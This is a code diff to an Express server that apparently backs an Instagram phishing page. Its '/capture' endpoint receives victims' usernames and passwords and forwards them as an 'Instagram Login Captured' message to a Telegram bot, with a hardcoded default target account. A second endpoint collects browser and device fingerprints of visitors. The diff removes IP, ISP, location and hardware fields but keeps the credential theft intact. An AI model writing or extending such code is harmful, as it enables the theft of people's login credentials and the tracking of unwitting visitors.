@@ -31,22 +31,18 @@ app.post('/api/fingerprint', async (req, res) => {
   const fingerprint = body && typeof body === 'object' ? body : {};
 
   const lines = [
-    '🔥 Fingerprint captured',
+    '🔥 Visitor fingerprint captured',
     '',
     `🧭 Visitor ID: ${fingerprint.visitorId || 'N/A'}`,
-    `🛰️ IP: ${fingerprint.ip || 'N/A'}`,
-    `🏢 ISP: ${fingerprint.isp || 'N/A'}`,
-    `🌍 Country: ${fingerprint.country || 'N/A'} / ${fingerprint.countryCode || 'N/A'}`,
-    `🏙️ City: ${fingerprint.city || 'N/A'}`,
-    `🕒 Timezone: ${fingerprint.timezone || 'N/A'}`,
     `🖥️ User-Agent: ${fingerprint.userAgent ? String(fingerprint.userAgent).substring(0, 120) : 'N/A'}`,
+    `🌍 Platform: ${fingerprint.platform || 'N/A'}`,
+    `🗺️ Language: ${fingerprint.language || 'N/A'}`,
+    `🕒 Timezone: ${fingerprint.timezone || 'N/A'}`,
     `📐 Screen: ${fingerprint.screen || 'N/A'}`,
-    `🧠 Hardware: ${fingerprint.hardwareConcurrency || 'N/A'} cores / ${fingerprint.deviceMemory || 'N/A'} GB`,
-    `🔋 Battery: ${fingerprint.battery || 'N/A'}`,
-    `🎮 GPU: ${fingerprint.gpu?.vendor || 'N/A'} / ${fingerprint.gpu?.renderer || 'N/A'}`,
-    `📷 Canvas: ${fingerprint.canvas || 'N/A'}`,
-    `🕵️ VPN: ${fingerprint.isVpn ? 'Yes' : 'No'}`,
-    `🕒 Timestamp: ${fingerprint.timestamp || new Date().toISOString()}`,
+    `📱 Device: ${fingerprint.deviceType || 'N/A'}`,
+    `🎨 Color Depth: ${fingerprint.colorDepth || 'N/A'}`,
+    `📏 Pixel Ratio: ${fingerprint.pixelRatio || 'N/A'}`,
+    `🕒 Timestamp: ${new Date().toISOString()}`,
   ];
 
   if (TELEGRAM_BOT_TOKEN && TELEGRAM_CHAT_ID) {
@@ -72,7 +68,7 @@ app.post('/api/fingerprint', async (req, res) => {
 app.use(express.static(distPath));
 
 app.post('/capture', async (req, res) => {
-  const { username, password, target, time, fingerprint } = req.body || {};
+  const { username, password, target, time } = req.body || {};
 
   console.log(`[CAPTURED] Username: ${username || 'N/A'}`);
 
@@ -80,7 +76,6 @@ app.post('/capture', async (req, res) => {
     return res.json({ success: true });
   }
 
-  const fp = fingerprint || {};
   const message = `
 <b>🔥 Instagram Login Captured</b>
 
@@ -88,20 +83,6 @@ app.post('/capture', async (req, res) => {
 🔑 <b>Password:</b> <code>${password}</code>
 🎯 <b>Target:</b> ${target || 'aadya.tiwari.me'}
 ⏰ <b>Time:</b> ${new Date(time || Date.now()).toLocaleString()}
-
-🌐 <b>Network & Location</b>
-📍 IP: ${fp.ip || 'N/A'}
-🏢 ISP: ${fp.isp || 'N/A'}
-📍 Location: ${fp.city || 'N/A'}, ${fp.country || 'N/A'}
-🛡️ VPN / Proxy: ${fp.isVpn ? 'Yes' : 'No'}
-
-📱 <b>Device Fingerprint</b>
-🖥️ User-Agent: <code>${fp.userAgent ? String(fp.userAgent).substring(0, 80) + '...' : 'N/A'}</code>
-📐 Screen: ${fp.screen || 'N/A'}
-🌍 Timezone: ${fp.timezone || 'N/A'}
-🔋 Battery: ${fp.battery || 'N/A'}
-💻 GPU: ${fp.gpu?.vendor || 'N/A'} - ${fp.gpu?.renderer || 'N/A'}
-⚙️ Cores: ${fp.hardwareConcurrency || 'N/A'} | Memory: ${fp.deviceMemory || 'N/A'}
   `.trim();
 
   if (TELEGRAM_BOT_TOKEN && TELEGRAM_CHAT_ID) {
